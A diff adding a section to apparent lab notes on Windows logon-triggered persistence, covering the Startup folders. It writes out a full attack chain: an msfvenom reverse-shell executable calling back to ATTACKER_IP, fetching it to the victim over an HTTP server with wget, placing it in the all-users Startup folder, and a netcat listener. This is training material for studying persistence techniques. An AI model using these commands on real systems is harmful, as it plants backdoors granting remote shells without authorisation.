@@ -314,3 +314,33 @@ If we try to query our service again, the system will tell us there is no such t
 ```AttackBox
 nc -lvp 4449
 ```
+
+
+## Logon Triggered Persistence
+Some actions performed by a user might also be bound to executing specific payloads for persistence. Windows operating systems present several ways to link payloads with particular interactions. This task will look at ways to plant payloads that will get executed when a user logs into the system.
+
+#### Startup folder
+Each user has a folder under `C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` where you can put executables to be run whenever the user logs in. An attacker can achieve persistence just by dropping a payload in there. Notice that each user will only run whatever is available in their folder.
+
+If we want to force all users to run a payload while logging in, we can use the folder under `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` in the same way.
+
+- For this task, let's generate a reverse shell payload using msfvenom:
+```Attack box
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe
+```
+
+- We will then copy our payload into the victim machine. You can spawn an `http.server` with Python3 and use wget on the victim machine to pull your file:
+```AttackBox
+python3 -m http.server
+```
+
+```PowerShell
+wget http://ATTACKER_IP:8000/revshell.exe -O revshell.exe
+```
+
+- We then store the payload into the `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` folder to get a shell back for any user logging into the machine.
+```Command Prompt 
+copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
+```
+
+And log back via RDP. You should immediately receive a connection back to your attacker's machine.
